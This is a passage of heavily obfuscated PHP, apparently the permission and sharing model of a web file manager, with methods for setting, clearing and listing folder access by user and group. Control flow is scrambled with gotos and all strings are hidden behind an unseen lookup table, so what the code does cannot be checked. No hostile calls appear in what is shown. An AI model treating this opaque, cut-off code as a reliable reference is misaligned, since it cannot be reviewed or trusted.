public function reportStatus($fã»ÛËÀ¥) { goto cÂ“ÒæÜ¤; C³„Ï…Ş×»: $E™ŞêŸÓ = Model($fšô•¥¥Øî[1799])->where($dìñ¼à³½Ú)->save($bå§ßÉšöÅ); if ($fã»ÛËÀ¥[$fšô•¥¥Øî[690]] == $fšô•¥¥Øî[1804]) { if ($eÚ¾®øÔĞõ[$fšô•¥¥Øî[435]] != $fšô•¥¥Øî[485] && $this->shareFileMeta($eÚ¾®øÔĞõ[$fšô•¥¥Øî[435]])) { $this->shareFileMeta($eÚ¾®øÔĞõ[$fšô•¥¥Øî[435]], 0); } $this->remove($eÚ¾®øÔĞõ[$fšô•¥¥Øî[456]]); return !0; } if ($E™ŞêŸÓ && $fã»ÛËÀ¥[$fšô•¥¥Øî[690]] == $fšô•¥¥Øî[1805]) { $f‹¤Å†í«ï = $bå§ßÉšöÅ[$fšô•¥¥Øî[690]] == $fšô•¥¥Øî[1805] ? 1 : 0; $this->shareFileMeta($eÚ¾®øÔĞõ[$fšô•¥¥Øî[435]], $f‹¤Å†í«ï); $this->removeByFile($eÚ¾®øÔĞõ[$fšô•¥¥Øî[435]]); } goto F¬Ä¤ŒÄ™Ñ; E²Õ¥“ç—Å: if (!$eÚ¾®øÔĞõ) { return !1; } $bå§ßÉšöÅ = array($fšô•¥¥Øî[690] => $fã»ÛËÀ¥[$fšô•¥¥Øî[690]]); if ($fã»ÛËÀ¥[$fšô•¥¥Øî[690]] == $fšô•¥¥Øî[1805] && $eÚ¾®øÔĞõ[$fšô•¥¥Øî[690]] == $fšô•¥¥Øî[1805]) { $bå§ßÉšöÅ[$fšô•¥¥Øî[690]] = 0; } goto C³„Ï…Ş×»; cÂ“ÒæÜ¤: $fšô•¥¥Øî =& $_SERVER[úÎü]; $dìñ¼à³½Ú = array($fšô•¥¥Øî[383] => $fã»ÛËÀ¥[$fšô•¥¥Øî[383]]); $eÚ¾®øÔĞõ = Model($fšô•¥¥Øî[1799])->where($dìñ¼à³½Ú)->field($fšô•¥¥Øî[1809])->find(); goto E²Õ¥“ç—Å; F¬Ä¤ŒÄ™Ñ: return $E™ŞêŸÓ; goto DÈå³Ä¾§; DÈå³Ä¾§: } private function removeByFile($cİõÛİ‚§Ë) { goto FàÉÁ„¯ñ; dîŠÊÅ’Ñ: $B»×ÄÃ–¢ = array_to_keyvalue($f¶’¦í¹÷, $CÂÕîİÕ©š[33], $CÂÕîİÕ©š[456]); $this->remove($B»×ÄÃ–¢); goto BÙÑñÀğª¢; FàÉÁ„¯ñ: $CÂÕîİÕ©š =& $_SERVER[úÎü]; $f¶’¦í¹÷ = Model($CÂÕîİÕ©š[752])->where(array($CÂÕîİÕ©š[435] => $cİõÛİ‚§Ë))->field($CÂÕîİÕ©š[385])->select(); $aîŒË÷Ê³º = array_to_keyvalue($f¶’¦í¹÷, $CÂÕîİÕ©š[33], $CÂÕîİÕ©š[385]); goto B‰ŒÜÈ±Ç; B‰ŒÜÈ±Ç: $eÔ“‚Ú’äã = array($CÂÕîİÕ©š[385] => array($CÂÕîİÕ©š[7], $aîŒË÷Ê³º), $CÂÕîİÕ©š[461] => 1); $f¶’¦í¹÷ = Model($CÂÕîİÕ©š[1621])->where($eÔ“‚Ú’äã)->field($CÂÕîİÕ©š[456])->select(); if (empty($f¶’¦í¹÷)) { return; } goto dîŠÊÅ’Ñ; BÙÑñÀğª¢: } private function shareFileMeta($AŒİ¤‡¾º×, $bÏ®İ¼ŸÄª = null) { $A‚Ş·–†œŒ =& $_SERVER[úÎü]; $CÖŞÉ®¤¤í = array($A‚Ş·–†œŒ[435] => $AŒİ¤‡¾º×, $A‚Ş·–†œŒ[89] => $A‚Ş·–†œŒ[1810]); if (is_null($bÏ®İ¼ŸÄª)) { return Model($A‚Ş·–†œŒ[1811])->where($CÖŞÉ®¤¤í)->find(); } $CÖŞÉ®¤¤í[$A‚Ş·–†œŒ[366]] = $bÏ®İ¼ŸÄª; Model($A‚Ş·–†œŒ[1811])->add($CÖŞÉ®¤¤í, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\x75\x72\143\x65\137\x61\165\164\150"; public function getAuth($bŠŠïğ•Ú) { goto cùİ·‡Ûå´; b¹‚ËÙÒÁİ: $EøƒĞ»»Åó = $this->field($AÛÑ–¿†ïË)->order($EËš˜Ùªå«[383])->where($bíæ¹ÊğÆ²)->select(); $cÎÂŠ¾à = array(); $D¨‹‹Ñã³  = array(); goto Cå­ğ¹Çñ‡; cùİ·‡Ûå´: $EËš˜Ùªå« =& $_SERVER[úÎü]; $AÛÑ–¿†ïË = $EËš˜Ùªå«[1812]; $bíæ¹ÊğÆ² = array($EËš˜Ùªå«[385] => $bŠŠïğ•Ú); goto b¹‚ËÙÒÁİ; Cå­ğ¹Çñ‡: $DËµÕ¢¯— = 2 << 25; foreach ($EøƒĞ»»Åó as $a©·œ½¦Œ³) { goto DÀÈÙï­ÜÁ; c¹­‹„™Œ“: $AÈÁÀè¸°· = 0; if ($a©·œ½¦Œ³[$EËš˜Ùªå«[387]] == SourceModel::TYPE_GROUP) { $AÈÁÀè¸°· = $DËµÕ¢¯— * 2; } if ($a©·œ½¦Œ³[$EËš˜Ùªå«[387]] == SourceModel::TYPE_USER) { $AÈÁÀè¸°· = $DËµÕ¢¯—; } goto D¾Ÿã§ôÎ; DÀÈÙï­ÜÁ: $CÅ¾Ïª±ÂĞ = Model($EËš˜Ùªå«[1813])->listData($a©·œ½¦Œ³[$EËš˜Ùªå«[1793]]); if (!$CÅ¾Ïª±ÂĞ) { continue; } $cÎÂŠ¾à[] = $a©·œ½¦Œ³; goto c¹­‹„™Œ“; D¾Ÿã§ôÎ: if ($a©·œ½¦Œ³[$EËš˜Ùªå«[387]] == SourceModel::TYPE_USER && $a©·œ½¦Œ³[$EËš˜Ùªå«[473]] == $EËš˜Ùªå«[485]) { $AÈÁÀè¸°· = 0; } $D¨‹‹Ñã³ [] = $CÅ¾Ïª±ÂĞ[$EËš˜Ùªå«[392]] + $AÈÁÀè¸°·; goto AÚ“ñŸï·; AÚ“ñŸï·: } array_multisort($D¨‹‹Ñã³ , SORT_DESC, $cÎÂŠ¾à); goto d‚‹ÇÑš”Ô; d‚‹ÇÑš”Ô: return $cÎÂŠ¾à; goto f”Úˆà© ‘; f”Úˆà© ‘: } public function setAuth($fâÖßÅ¶Öè, $C°„Şˆ·ŞŒ) { goto d†Ê¼ÀçÖ¤; d†Ê¼ÀçÖ¤: $añ¥Ø¬Öß =& $_SERVER[úÎü]; $CÓŸ•¹‡ø = Model($añ¥Ø¬Öß[1162])->sourceInfo($fâÖßÅ¶Öè); if (!$CÓŸ•¹‡ø) { return !1; } goto B½‘·ƒù†; FÖ›ŸÀ§£: return !0; goto CÈ£îÜŞíõ; Eæ“™Øí: foreach ($C°„Şˆ·ŞŒ as $båæ¤ãİÇ) { if (!in_array($båæ¤ãİÇ[$añ¥Ø¬Öß[387]], $c‚·Ëˆ¢ŠÆ)) { show_json(LNG($añ¥Ø¬Öß[1814]), !1); } if ($D¬à¥†Ë != $aÕ¿¦Š¡œ‹) { if ($båæ¤ãİÇ[$añ¥Ø¬Öß[387]] == SourceModel::TYPE_GROUP) { } if ($båæ¤ãİÇ[$añ¥Ø¬Öß[473]] != 0 && !in_array($båæ¤ãİÇ[$añ¥Ø¬Öß[473]], $AˆÒõ¿Ğ…ê)) { } } if ($båæ¤ãİÇ[$añ¥Ø¬Öß[473]] == 0) { $båæ¤ãİÇ[$añ¥Ø¬Öß[387]] = SourceModel::TYPE_USER; } $F—³˜ëÚ[] = array($añ¥Ø¬Öß[385] => $fâÖßÅ¶Öè, $añ¥Ø¬Öß[387] => intval($båæ¤ãİÇ[$añ¥Ø¬Öß[387]]), $añ¥Ø¬Öß[473] => intval($båæ¤ãİÇ[$añ¥Ø¬Öß[473]]), $añ¥Ø¬Öß[1793] => intval($båæ¤ãİÇ[$añ¥Ø¬Öß[1793]]) ? intval($båæ¤ãİÇ[$añ¥Ø¬Öß[1793]]) : 0, $añ¥Ø¬Öß[1794] => intval($båæ¤ãİÇ[$añ¥Ø¬Öß[1794]]) ? intval($båæ¤ãİÇ[$añ¥Ø¬Öß[1794]]) : -1); } $this->where(array($añ¥Ø¬Öß[399] => $fâÖßÅ¶Öè))->delete(); $this->addAll($F—³˜ëÚ); goto FÖ›ŸÀ§£; b›Ú«Õá‚: if ($D¬à¥†Ë != $aÕ¿¦Š¡œ‹) { $E¥Æ‹Êñ ¶ = array($añ¥Ø¬Öß[1644] => $D¬à¥†Ë); $AˆÒõ¿Ğ…ê = Model($añ¥Ø¬Öß[1727])->field($añ¥Ø¬Öß[1485])->where($E¥Æ‹Êñ ¶)->select(); $AˆÒõ¿Ğ…ê = array_to_keyvalue($AˆÒõ¿Ğ…ê, $añ¥Ø¬Öß[33], $añ¥Ø¬Öß[1485]); } $c‚·Ëˆ¢ŠÆ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $F—³˜ëÚ = array(); goto Eæ“™Øí; B½‘·ƒù†: if ($CÓŸ•¹‡ø[$añ¥Ø¬Öß[387]] != SourceModel::TYPE_GROUP) { return !1; } $aÕ¿¦Š¡œ‹ = 1; $D¬à¥†Ë = $CÓŸ•¹‡ø[$añ¥Ø¬Öß[473]]; goto b›Ú«Õá‚; CÈ£îÜŞíõ: } public function authClear($f‹¢ğµ³Â¤) { $AÃ¯ øÔÊê =& $_SERVER[úÎü]; $Fƒ ÆĞ¾Æ´ = Model($AÃ¯ øÔÊê[1162])->sourceInfo($f‹¢ğµ³Â¤); $dçóÙÄöœ = array($f‹¢ğµ³Â¤); if ($Fƒ ÆĞ¾Æ´[$AÃ¯ øÔÊê[386]] == $AÃ¯ øÔÊê[83]) { $fºÊĞ„ÕË = array($AÃ¯ øÔÊê[542] => array($AÃ¯ øÔÊê[500], $Fƒ ÆĞ¾Æ´[$AÃ¯ øÔÊê[476]] . $f‹¢ğµ³Â¤ . $AÃ¯ øÔÊê[501])); $dçóÙÄöœ = Model($AÃ¯ øÔÊê[1162])->field($AÃ¯ øÔÊê[399])->where($fºÊĞ„ÕË)->getField($AÃ¯ øÔÊê[385], !0); $dçóÙÄöœ[] = $f‹¢ğµ³Â¤; } $this->where(array($AÃ¯ øÔÊê[399] => array($AÃ¯ øÔÊê[400], $dçóÙÄöœ)))->delete(); return !0; } public function getAllChildren($f„Æ•àÈÏì) { goto aÓ¢”ˆêõğ; B’óèä£ˆ: if ($EˆÒë¡…Íä[$DœÃ„éŒØÀ[478]] == $DœÃ„éŒØÀ[485] && $EˆÒë¡…Íä[$DœÃ„éŒØÀ[473]] != $Eæ”„Í’áÀ) { $cŸ£â”çäÑ = $this->groupChidldAllRootSource($EˆÒë¡…Íä[$DœÃ„éŒØÀ[473]]); } $aŠ¬§”ƒŒ¶ = $this->field($DœÃ„éŒØÀ[385])->group($DœÃ„éŒØÀ[385])->select(); $aŠ¬§”ƒŒ¶ = array_to_keyvalue($aŠ¬§”ƒŒ¶, $DœÃ„éŒØÀ[33], $DœÃ„éŒØÀ[385]); goto BÕÛÒ¶¶çÍ; aÓ¢”ˆêõğ: $DœÃ„éŒØÀ =& $_SERVER[úÎü]; $EˆÒë¡…Íä = Model($DœÃ„éŒØÀ[1162])->sourceInfo($f„Æ•àÈÏì); if ($EˆÒë¡…Íä[$DœÃ„éŒØÀ[386]] != $DœÃ„éŒØÀ[83]) { return $this->sourceListAuth(array($f„Æ•àÈÏì)); } goto a¨“‰îÍ; D‹†Æ¹Ğ†: $BçŞÖ£ä½ø = Model($DœÃ„éŒØÀ[752])->field($f¬÷¶·Ô—š)->where($a¦µÂæé‘Í)->select(); $CŸøØ•”Ç = array($f„Æ•àÈÏì); foreach ($BçŞÖ£ä½ø as $cÉ×‡ô·) { foreach ($cŸ£â”çäÑ as $céèˆ™©â¹) { $fçºöóáÔ² = $DœÃ„éŒØÀ[47] . $céèˆ™©â¹ . $DœÃ„éŒØÀ[47]; $dáäÕÈ‰ÒÁ = $cÉ×‡ô·[$DœÃ„éŒØÀ[476]] . $cÉ×‡ô·[$DœÃ„éŒØÀ[385]] . $DœÃ„éŒØÀ[47]; if (strstr($dáäÕÈ‰ÒÁ, $fçºöóáÔ²)) { $CŸøØ•”Ç[] = $cÉ×‡ô·[$DœÃ„éŒØÀ[385]]; break; } } } goto c–„ ·³à°; BÕÛÒ¶¶çÍ: if (!$aŠ¬§”ƒŒ¶) { return array(); } $f¬÷¶·Ô—š = $DœÃ„éŒØÀ[1815]; $a¦µÂæé‘Í = array($DœÃ„éŒØÀ[385] => array($DœÃ„éŒØÀ[7], $aŠ¬§”ƒŒ¶), $DœÃ„éŒØÀ[413] => $DœÃ„éŒØÀ[485]); goto D‹†Æ¹Ğ†; c–„ ·³à°: return $this->sourceListAuth($CŸøØ•”Ç); goto Bä‡ô«‡ïÕ; a¨“‰îÍ: if ($EˆÒë¡…Íä[$DœÃ„éŒØÀ[387]] != SourceModel::TYPE_GROUP) { return array(); } $Eæ”„Í’áÀ = 1; $cŸ£â”çäÑ = array($f„Æ•àÈÏì); goto B’óèä£ˆ; Bä‡ô«‡ïÕ: } private function sourceListAuth($b„ÖÌõ¦° ) { goto cÌÁ¡±©ß; F÷äîß³ğİ: return $aØ„õ´ÓŒ; goto bØÈÌšÓã; cÓº×¥Á·•: $CÏËÎãÔì = $this->field($bĞ‡í‘–öª)->where(array($A•È¾¿óëÁ[385] => array($A•È¾¿óëÁ[7], $b„ÖÌõ¦° )))->select(); $D¼¥Û·›Ô÷ = array_to_keyvalue_group($CÏËÎãÔì, $A•È¾¿óëÁ[385]); $aØ„õ´ÓŒ = array(); goto A×êÌßÑ“ô; A×êÌßÑ“ô: $bÄ²õª¾ê± = array(); foreach ($F©®°ë‰Å¯ as $D£¾ñŠ­ïª) { goto c©§íÛ¼“Ò; f‡¬ˆÉÇÅ›: $bõº§À”” = count(explode($A•È¾¿óëÁ[8], trim($D£¾ñŠ­ïª[$A•È¾¿óëÁ[483]], $A•È¾¿óëÁ[8]))); $bÄ²õª¾ê±[] = $bõº§À”” + ($D£¾ñŠ­ïª[$A•È¾¿óëÁ[29]] == $A•È¾¿óëÁ[76] ? 0 : 1000); goto f²¾Œ§ÉŒŞ; c©§íÛ¼“Ò: unset($D£¾ñŠ­ïª[$A•È¾¿óëÁ[395]]); unset($D£¾ñŠ­ïª[$A•È¾¿óëÁ[394]]); unset($D£¾ñŠ­ïª[$A•È¾¿óëÁ[392]]); goto Bêè´ß‚é±; Bêè´ß‚é±: unset($D£¾ñŠ­ïª[$A•È¾¿óëÁ[407]]); $C‘˜İƒ®£ƒ = $D¼¥Û·›Ô÷[$D£¾ñŠ­ïª[$A•È¾¿óëÁ[385]]]; if (!$C‘˜İƒ®£ƒ) { continue; } goto D»ÖÉç´óç; D»ÖÉç´óç: $D£¾ñŠ­ïª[$A•È¾¿óëÁ[1816]] = $this->authTargetInfo($C‘˜İƒ®£ƒ); $D£¾ñŠ­ïª[$A•È¾¿óëÁ[483]] = rtrim($D£¾ñŠ­ïª[$A•È¾¿óëÁ[479]], $A•È¾¿óëÁ[8]) . $A•È¾¿óëÁ[8] . ltrim($D£¾ñŠ­ïª[$A•È¾¿óëÁ[483]], $A•È¾¿óëÁ[8]); $aØ„õ´ÓŒ[] = $D£¾ñŠ­ïª; goto f‡¬ˆÉÇÅ›; f²¾Œ§ÉŒŞ: } array_multisort($bÄ²õª¾ê±, SORT_ASC, $aØ„õ´ÓŒ); goto F÷äîß³ğİ; cÌÁ¡±©ß: $A•È¾¿óëÁ =& $_SERVER[úÎü]; $F©®°ë‰Å¯ = Model($A•È¾¿óëÁ[1162])->sourceListInfo($b„ÖÌõ¦° , !0); $bĞ‡í‘–öª = $A•È¾¿óëÁ[1812]; goto cÓº×¥Á·•; bØÈÌšÓã: } private function groupChidldAllRootSource($a˜•‚¼­ëÆ) { $bÔ‰Íœî±• =& $_SERVER[úÎü]; $CÛÛ¬ì„åä = Model($bÔ‰Íœî±•[1817])->groupChildrenAll($a˜•‚¼­ëÆ); $E‹Å‚õ¶ = array($bÔ‰Íœî±•[478] => 0, $bÔ‰Íœî±•[473] => array($bÔ‰Íœî±•[7], $CÛÛ¬ì„åä), $bÔ‰Íœî±•[387] => SourceModel::TYPE_GROUP); $fÛœÊø»µÚ = Model($bÔ‰Íœî±•[752])->field($bÔ‰Íœî±•[385])->where($E‹Å‚õ¶)->select(); $fÛœÊø»µÚ = array_to_keyvalue($fÛœÊø»µÚ, $bÔ‰Íœî±•[33], $bÔ‰Íœî±•[385]); return $fÛœÊø»µÚ; } private function authTargetInfo($Aİ¶ºÇˆ˜) { goto F™ÛÅ—Ñ—; AÂˆŒÖîª: $fæ¼¤ÓÏ„³ = 2 << 25; foreach ($Aİ¶ºÇˆ˜ as $B†Ÿ²Ğ¢‘ï) { goto EÚÙƒàÉÉ×; A´ÉÔÆ„ä: $B¦Ñ½ŞÙÖ = 0; if ($B†Ÿ²Ğ¢‘ï[$CÆ¥»ºÄÅá[387]] == SourceModel::TYPE_GROUP) { $B¦Ñ½ŞÙÖ = $fæ¼¤ÓÏ„³ * 2; } if ($B†Ÿ²Ğ¢‘ï[$CÆ¥»ºÄÅá[387]] == SourceModel::TYPE_USER) { $B¦Ñ½ŞÙÖ = $fæ¼¤ÓÏ„³; } goto eÆñòÒ¥¿; eÆñòÒ¥¿: if ($B†Ÿ²Ğ¢‘ï[$CÆ¥»ºÄÅá[387]] == SourceModel::TYPE_USER && $B†Ÿ²Ğ¢‘ï[$CÆ¥»ºÄÅá[473]] == $CÆ¥»ºÄÅá[485]) { $B¦Ñ½ŞÙÖ = 0; } $dÏ¤«—[] = $DŞÆÎ•ã„½[$CÆ¥»ºÄÅá[392]] + $B¦Ñ½ŞÙÖ; goto C­·£†õïª; eõÆÕ‰¸±: if (!$Dç¥ùİ¶²) { continue; } $Dç¥ùİ¶²[$CÆ¥»ºÄÅá[434]] = $DŞÆÎ•ã„½; $b•„³ÊÛ[] = $Dç¥ùİ¶²; goto A´ÉÔÆ„ä; EÚÙƒàÉÉ×: $DŞÆÎ•ã„½ = Model($CÆ¥»ºÄÅá[1813])->listData($B†Ÿ²Ğ¢‘ï[$CÆ¥»ºÄÅá[1793]]); if (!$DŞÆÎ•ã„½) { continue; } if ($B†Ÿ²Ğ¢‘ï[$CÆ¥»ºÄÅá[387]] == SourceModel::TYPE_USER) { $Dç¥ùİ¶² = Model($CÆ¥»ºÄÅá[491])->getInfoSimpleOuter($B†Ÿ²Ğ¢‘ï[$CÆ¥»ºÄÅá[473]]); if ($Dç¥ùİ¶²[$CÆ¥»ºÄÅá[1485]] == $CÆ¥»ºÄÅá[1045]) { continue; } if ($Dç¥ùİ¶²[$CÆ¥»ºÄÅá[1485]] == $CÆ¥»ºÄÅá[485]) { $Dç¥ùİ¶²[$CÆ¥»ºÄÅá[28]] = LNG($CÆ¥»ºÄÅá[1818]); } } else { $Dç¥ùİ¶² = Model($CÆ¥»ºÄÅá[475])->getInfoSimple($B†Ÿ²Ğ¢‘ï[$CÆ¥»ºÄÅá[473]]); } goto eõÆÕ‰¸±; C­·£†õïª: } array_multisort($dÏ¤«—, SORT_DESC, $b•„³ÊÛ); goto CÎ©ê¬¿ÔÏ; CÎ©ê¬¿ÔÏ: return $b•„³ÊÛ; goto f´ŠîòÌ©ğ; F™ÛÅ—Ñ—: $CÆ¥»ºÄÅá =& $_SERVER[úÎü]; $b•„³ÊÛ = array(); $dÏ¤«— = array(); goto AÂˆŒÖîª; f´ŠîòÌ©ğ: } public function getAllChildrenByUser($c¬ÌãÈÚ, $Cœ½ãÚØÏ) { goto CáÉøÌÜìğ; a½Åô–‰‹‡: $fô£ÚòàŒ· = Model($Cõ‰õàÄ²[1162])->sourceInfo($c¬ÌãÈÚ); $Bò£¤ë°´å = array(); $aàÄÄÅ› = 1; goto DåÇ¤¢§×Ü; DåÇ¤¢§×Ü: if ($fô£ÚòàŒ·[$Cõ‰õàÄ²[478]] == $Cõ‰õàÄ²[485] && $fô£ÚòàŒ·[$Cõ‰õàÄ²[473]] != $aàÄÄÅ› && $this->groupContainUser($fô£ÚòàŒ·[$Cõ‰õàÄ²[473]], $Cœ½ãÚØÏ)) { foreach ($bÈ¶ãù‚É©[$Cõ‰õàÄ²[1819]] as $AÁÅˆÛ½ğõ) { $D±»Ò•òâî = Model($Cõ‰õàÄ²[475])->getInfo($AÁÅˆÛ½ğõ[$Cõ‰õàÄ²[1644]]); $aĞÒµ”Œàß = Model($Cõ‰õàÄ²[494])->getInfoSimpleOuter($Cœ½ãÚØÏ); $aĞÒµ”Œàß[$Cõ‰õàÄ²[434]] = $AÁÅˆÛ½ğõ[$Cõ‰õàÄ²[392]]; if (Model($Cõ‰õàÄ²[1813])->authCheckAction($AÁÅˆÛ½ğõ[$Cõ‰õàÄ²[392]][$Cõ‰õàÄ²[392]], $Cõ‰õàÄ²[1664])) { continue; } $e‹ë¸÷Ü³Á = array($Cõ‰õàÄ²[28] => $Cõ‰õàÄ²[1437] . $D±»Ò•òâî[$Cõ‰õàÄ²[28]], $Cõ‰õàÄ²[385] => $D±»Ò•òâî[$Cõ‰õàÄ²[407]][$Cõ‰õàÄ²[385]], $Cõ‰õàÄ²[75] => KodIO::make($D±»Ò•òâî[$Cõ‰õàÄ²[407]][$Cõ‰õàÄ²[385]]), $Cõ‰õàÄ²[478] => $Cõ‰õàÄ²[485], $Cõ‰õàÄ²[387] => $Cõ‰õàÄ²[976], $Cõ‰õàÄ²[29] => $Cõ‰õàÄ²[505], $Cõ‰õàÄ²[483] => $D±»Ò•òâî[$Cõ‰õàÄ²[480]], $Cõ‰õàÄ²[1644] => $D±»Ò•òâî[$Cõ‰õàÄ²[1644]], $Cõ‰õàÄ²[477] => $D±»Ò•òâî[$Cõ‰õàÄ²[478]], $Cõ‰õàÄ²[1816] => array($aĞÒµ”Œàß)); $Bò£¤ë°´å[$e‹ë¸÷Ü³Á[$Cõ‰õàÄ²[385]]] = $e‹ë¸÷Ü³Á; } } $EØÎ¯ËçÑç = array(); $d’İŞÃ˜½ = $this->getAllChildren($c¬ÌãÈÚ); goto EàôçØ°©Ì; EàôçØ°©Ì: foreach ($d’İŞÃ˜½ as $B¡Š«ÃÊË) { $f¡‚®øƒÓ› = !1; foreach ($B¡Š«ÃÊË[$Cõ‰õàÄ²[1816]] as $CÎâ¶âÛ¢) { if ($CÎâ¶âÛ¢[$Cõ‰õàÄ²[1485]]) { if ($CÎâ¶âÛ¢[$Cõ‰õàÄ²[1485]] == $Cœ½ãÚØÏ) { $f¡‚®øƒÓ› = !0; break; } } if ($CÎâ¶âÛ¢[$Cõ‰õàÄ²[1644]]) { if ($this->groupContainUser($CÎâ¶âÛ¢[$Cõ‰õàÄ²[1644]], $Cœ½ãÚØÏ)) { $f¡‚®øƒÓ› = !0; break; } } } if ($f¡‚®øƒÓ›) { $EØÎ¯ËçÑç[] = $B¡Š«ÃÊË; } $däñé‰ÀÍ• = $B¡Š«ÃÊË[$Cõ‰õàÄ²[385]]; if (isset($Bò£¤ë°´å[$däñé‰ÀÍ•])) { $B¡Š«ÃÊË[$Cõ‰õàÄ²[1816]][] = $Bò£¤ë°´å[$däñé‰ÀÍ•][0]; $Bò£¤ë°´å[$däñé‰ÀÍ•] = !1; } } $Bò£¤ë°´å = array_filter(array_values($Bò£¤ë°´å)); $EØÎ¯ËçÑç = array_merge($Bò£¤ë°´å, $EØÎ¯ËçÑç); goto Aˆ¤ÃÂÄâ—; CáÉøÌÜìğ: $Cõ‰õàÄ² =& $_SERVER[úÎü]; $bÈ¶ãù‚É© = Model($Cõ‰õàÄ²[494])->getInfo($Cœ½ãÚØÏ); if (!$Cœ½ãÚØÏ || !$c¬ÌãÈÚ || !$bÈ¶ãù‚É©) { return array(); } goto a½Åô–‰‹‡; Aˆ¤ÃÂÄâ—: return $EØÎ¯ËçÑç; goto BğÉÌ¨ªáé; BğÉÌ¨ªáé: } public function setAllChildrenByUser($F–ÁäÑñš¥, $C”ºññ¤, $FãĞ±–‡„Ş) { $F‰ÃË³Êƒ¥ =& $_SERVER[úÎü]; $a¬¢§‰œ’¬ = $this->getAllChildrenByUser($F–ÁäÑñš¥, $C”ºññ¤); if (!$FãĞ±–‡„Ş || !$a¬¢§‰œ’¬) { return !1; } foreach ($a¬¢§‰œ’¬ as $cÆ°Œ‡èîÀ) { $CÖÉ˜èÒÎ· = array(); foreach ($cÆ°Œ‡èîÀ[$F‰ÃË³Êƒ¥[1816]] as $B¬ï¨Ğ¦) { $e£ÄŒ‘¸ = $B¬ï¨Ğ¦[$F‰ÃË³Êƒ¥[434]]; $F³ğòò¥Ä = $B¬ï¨Ğ¦[$F‰ÃË³Êƒ¥[1485]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $f›¤Šß•¼Ô = $B¬ï¨Ğ¦[$F‰ÃË³Êƒ¥[1485]] ? $B¬ï¨Ğ¦[$F‰ÃË³Êƒ¥[1485]] : $B¬ï¨Ğ¦[$F‰ÃË³Êƒ¥[1644]]; if ($B¬ï¨Ğ¦[$F‰ÃË³Êƒ¥[1485]] && $B¬ï¨Ğ¦[$F‰ÃË³Êƒ¥[1485]] == $C”ºññ¤) { continue; } $CÖÉ˜èÒÎ·[] = array($F‰ÃË³Êƒ¥[385] => $cÆ°Œ‡èîÀ[$F‰ÃË³Êƒ¥[385]], $F‰ÃË³Êƒ¥[387] => $F³ğòò¥Ä, $F‰ÃË³Êƒ¥[473] => intval($f›¤Šß•¼Ô), $F‰ÃË³Êƒ¥[1793] => isset($e£ÄŒ‘¸[$F‰ÃË³Êƒ¥[383]]) ? intval($e£ÄŒ‘¸[$F‰ÃË³Êƒ¥[383]]) : 0, $F‰ÃË³Êƒ¥[1794] => isset($e£ÄŒ‘¸[$F‰ÃË³Êƒ¥[1794]]) ? intval($e£ÄŒ‘¸[$F‰ÃË³Êƒ¥[1794]]) : -1); } $CÖÉ˜èÒÎ·[] = array($F‰ÃË³Êƒ¥[385] => $cÆ°Œ‡èîÀ[$F‰ÃË³Êƒ¥[385]], $F‰ÃË³Êƒ¥[387] => SourceModel::TYPE_USER, $F‰ÃË³Êƒ¥[473] => intval($C”ºññ¤), $F‰ÃË³Êƒ¥[1793] => intval($FãĞ±–‡„Ş), $F‰ÃË³Êƒ¥[1794] => -1); $this->where(array($F‰ÃË³Êƒ¥[399] => $cÆ°Œ‡èîÀ[$F‰ÃË³Êƒ¥[385]]))->delete(); $this->addAll($CÖÉ˜èÒÎ·); } return !0; } public function get($a¶ØÄŠÁ¾) { $EÈ›µÄ‚îí = $this->getSourceList(array($a¶ØÄŠÁ¾), !0); return $EÈ›µÄ‚îí[0]; } public function getSourceList($C¸‡ãÅ£ì, $A­óàÍ¯õ = false, $e¯ëÄ­ò¡¿ = false) { goto f»áçÃ¨§æ; b‰¢®©å‹Ÿ: $e„è£Ÿ¦ö… = $Cªºˆ¶ğÊ›[1821]; $c†¡‹æÁº˜ = array($Cªºˆ¶ğÊ›[399] => array($Cªºˆ¶ğÊ›[400], $F„¾¶’ƒÜè)); $AÄ°­ùõê… = $this->field($e„è£Ÿ¦ö…)->where($c†¡‹æÁº˜)->select(); goto AâÑŒºëÏò; AâÑŒºëÏò: $AÄ°­ùõê… = array_to_keyvalue_group($AÄ°­ùõê…, $Cªºˆ¶ğÊ›[385]); $b—õàøæ— = array(); foreach ($F„¾¶’ƒÜè as $eĞÖ¥’ÀÁ) { if (isset($AÄ°­ùõê…[$eĞÖ¥’ÀÁ])) { $b—õàøæ—[$eĞÖ¥’ÀÁ] = $AÄ°­ùõê…[$eĞÖ¥’ÀÁ]; } } goto FáĞÕòè¤Ì; c‹Ç§ê­ê›: foreach ($A­óàÍ¯õ as $e„§º„÷šÑ => $c¿é‹—©ù¹) { $FĞ«Ø§–Š = $cí£Ë“ô™->parentLevelArray($c¿é‹—©ù¹[$Cªºˆ¶ğÊ›[476]]); $F„¾¶’ƒÜè = array_merge($F„¾¶’ƒÜè, array($e„§º„÷šÑ), array_reverse($FĞ«Ø§–Š)); } $F„¾¶’ƒÜè = array_values(array_unique($F„¾¶’ƒÜè)); if (!$F„¾¶’ƒÜè) { return array(); } goto b‰¢®©å‹Ÿ; f»áçÃ¨§æ: $Cªºˆ¶ğÊ› =& $_SERVER[úÎü]; if (!$C¸‡ãÅ£ì) { return array(); } $cí£Ë“ô™ = Model($Cªºˆ¶ğÊ›[1162]); goto dœÇÇÚ˜Ãß; FáĞÕòè¤Ì: $d¼ÊÊ‘¾ÜÉ = $this->userIsRoot($e¯ëÄ­ò¡¿); $Cè›”ÍÓ÷¬ = AuthModel::authAll(); $EÌ©âŸÑ‡ = array($Cªºˆ¶ğÊ›[393] => $Cè›”ÍÓ÷¬, $Cªºˆ¶ğÊ›[1822] => array($Cªºˆ¶ğÊ›[401] => 0, $Cªºˆ¶ğÊ›[1650] => $Cè›”ÍÓ÷¬, $Cªºˆ¶ğÊ›[402] => LNG($Cªºˆ¶ğÊ›[1823]), $Cªºˆ¶ğÊ›[1665] => $Cªºˆ¶ğÊ›[1824])); goto DÔ¦­š»µ—; DÔ¦­š»µ—: $cà‡âÚÌŠ‹ = array(); foreach ($A­óàÍ¯õ as $eĞÖ¥’ÀÁ => $A¦¨ŠÙÉÛŸ) { if ($d¼ÊÊ‘¾ÜÉ) { $cà‡âÚÌŠ‹[$eĞÖ¥’ÀÁ] = $EÌ©âŸÑ‡; continue; } $cà‡âÚÌŠ‹[$eĞÖ¥’ÀÁ] = $this->makeSourceAuth($A¦¨ŠÙÉÛŸ, $b—õàøæ—, $e¯ëÄ­ò¡¿); } return $cà‡âÚÌŠ‹; goto 